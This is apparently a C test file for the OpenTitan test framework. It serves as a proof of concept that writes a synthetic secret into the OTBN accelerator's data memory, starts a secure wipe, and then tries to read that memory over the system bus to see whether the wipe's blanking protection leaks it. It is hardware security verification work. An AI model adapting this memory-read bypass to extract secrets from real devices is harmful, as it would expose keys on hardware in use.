#include "sw/device/lib/runtime/log.h"
#include "sw/device/lib/base/mmio.h"
#include "sw/device/lib/base/memory.h"
#include "sw/device/lib/testing/test_framework/ottf_main.h"
#include "sw/device/lib/testing/test_framework/check.h"
#include "otbn_regs.h"
#include "hw/top_earlgrey/sw/autogen/top_earlgrey.h"
#include <string.h>

OTTF_DEFINE_TEST_CONFIG();

// Constants from DIF values (kept here to avoid using DIF API).
#define OTBN_CMD_SEC_WIPE_DMEM 0xC3
#define OTBN_STATUS_BUSY_SEC_WIPE_DMEM 0x02

bool test_main(void) {
  // Create mmio region for OTBN using autogen base address.
  mmio_region_t otbn = mmio_region_from_addr(TOP_EARLGREY_OTBN_BASE_ADDR);

  LOG_INFO("OTBN prim_blanker bypass POC starting");

  // Prepare a secret pattern to write into DMEM.
  enum { kDataLen = 64 };
  uint8_t secret[kDataLen];
  uint8_t read_back[kDataLen];
  for (int i = 0; i < kDataLen; ++i) {
    secret[i] = (uint8_t)(0xA5 + i);
    read_back[i] = 0;
  }

  // Write the secret into OTBN DMEM (word-aligned, mmio helper handles it).
  LOG_INFO("Writing secret into OTBN DMEM");
  mmio_region_memcpy_to_mmio32(otbn, OTBN_DMEM_REG_OFFSET, secret, kDataLen);

  // Issue a secure wipe of DMEM which should cause OTBN to be busy.
  LOG_INFO("Triggering OTBN secure wipe of DMEM (will enter busy state)");
  mmio_region_write32(otbn, OTBN_CMD_REG_OFFSET, OTBN_CMD_SEC_WIPE_DMEM);

  // Wait for OTBN to report the busy wipe state. If it never becomes busy, abort.
  int wait_cycles = 1000000;
  bool became_busy = false;
  for (int i = 0; i < wait_cycles; ++i) {
    uint32_t status = mmio_region_read32(otbn, OTBN_STATUS_REG_OFFSET);
    if ((status & 0xFF) == OTBN_STATUS_BUSY_SEC_WIPE_DMEM) {
      became_busy = true;
      break;
    }
  }

  CHECK(became_busy, "OTBN did not enter busy-sec-wipe-dmem state; cannot test leak");
  LOG_INFO("OTBN is busy wiping DMEM - attempting to read DMEM from system bus");

  // While OTBN is busy, attempt to read DMEM via the system bus MMIO window.
  // If the prim_blanker protection is broken, this read will return the secret.
  bool leak_observed = false;
  for (int attempt = 0; attempt < 100; ++attempt) {
    // Read back from DMEM
    memset(read_back, 0, sizeof(read_back));
    mmio_region_memcpy_from_mmio32(otbn, OTBN_DMEM_REG_OFFSET, read_back, kDataLen);

    if (memcmp(secret, read_back, kDataLen) == 0) {
      leak_observed = true;
      break;
    }
  }

  CHECK(leak_observed, "Failed to read OTBN DMEM while OTBN was busy - prim_blanker may be effective");

  LOG_INFO("Leak observed: able to read OTBN DMEM during secure wipe. Vulnerability present.");

  return true;
}
